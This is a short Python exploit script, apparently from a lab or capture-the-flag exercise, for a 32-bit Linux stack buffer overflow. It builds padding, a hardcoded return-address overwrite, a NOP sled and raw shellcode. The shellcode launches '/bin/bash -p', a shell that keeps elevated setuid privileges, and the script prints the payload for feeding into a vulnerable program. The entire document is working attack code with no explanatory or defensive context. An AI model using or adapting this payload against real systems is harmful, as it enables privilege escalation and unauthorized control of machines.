import struct
import sys


shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIKKKKLLLLMMMM"
eip = struct.pack("I", 0xffffd010+512)
nopsliede = b'\x90'*2048
payload = shellcode

sys.stdout.buffer.write(padding.encode(
    sys.stdout.encoding) + eip + nopsliede + payload + b'\n')
